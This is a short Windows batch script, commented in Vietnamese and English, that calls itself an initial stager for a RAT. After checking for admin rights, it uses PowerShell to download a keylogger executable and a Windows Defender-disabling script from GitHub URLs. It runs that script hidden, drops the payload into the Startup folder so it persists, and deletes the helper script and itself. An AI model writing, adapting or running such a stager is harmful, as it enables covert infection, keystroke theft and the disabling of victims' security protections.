@echo off

REM initial stager for RAT
REM created by

REM Kiểm tra quyền quản trị viên
net session >nul 2>&1
echo %errorlevel%
if %errorlevel% neq 0 (
    echo Vui long chay script voi quyen quan tri vien!
    pause
    exit /b
)
REM Chuyển đến thư mục Startup
cd /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
if %errorlevel% neq 0 (
    echo Khong the truy cap thu muc Startup!
    pause
    exit /b
)



REM  tai xuong payload 
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/CosmodiumCS/MalwareDNA/raw/main/rubberducky/DucKey-Logger/c.exe' -OutFile 'payload.exe'"
REM Tai xuong disable win defender 
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/dungkkk7/First-Dream/refs/heads/main/DisWinDef.ps1' -OutFile 'disWinDef.ps1'"
REM  disable denfender 
powershell -WindowStyle Hidden -File "disWinDef.ps1"

REM Tu lan restart tiep theo payload se tu dong run vi da duocj them vao start up 


REM  self delete 
(
    echo timeout /t 1 /nobreak ^>nul
    echo del /f /q "disWinDef.ps1"
) | cmd
(
    echo timeout /t 1 /nobreak ^>nul
    echo del /f /q "%~f0"
) | cmd


exit /b